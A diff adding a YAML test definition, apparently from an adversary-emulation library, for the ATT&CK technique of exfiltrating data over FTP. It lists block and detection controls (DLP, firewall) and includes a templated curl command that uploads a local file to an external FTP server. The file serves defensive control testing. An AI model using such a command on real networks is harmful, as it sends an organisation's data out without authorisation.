@@ -1,0 +1,20 @@
+name: Extract sensitive data over FTP
+description: Exfiltrate data from the internal network to an external system via FTP
+platforms:
+guidance:
+- https://dlptest.com/ftp-test/
+- shell> curl --ftp-create-dirs -T {{ local_file }} ftp://{{ username }}:{{ password }}@{{ server }}/{{ dest_path }}
+block:
+- Outbound connections over FTP are blocked by network security configurations
+- Sensitive data sent over the network is blocked by network DLP tool
+detect:
+- Sensitive data sent over the network is detected by network DLP tool
+controls:
+- DLP
+- Firewall
+metadata:
+  id: 11b7a86e-4596-4df9-a2a9-705096756d28
+  tid: T1048.003
+  tactic: TA0010
+  x_vectr_id: 11b7a86e-4596-4df9-a2a9-705096756d28
+  isv: 1
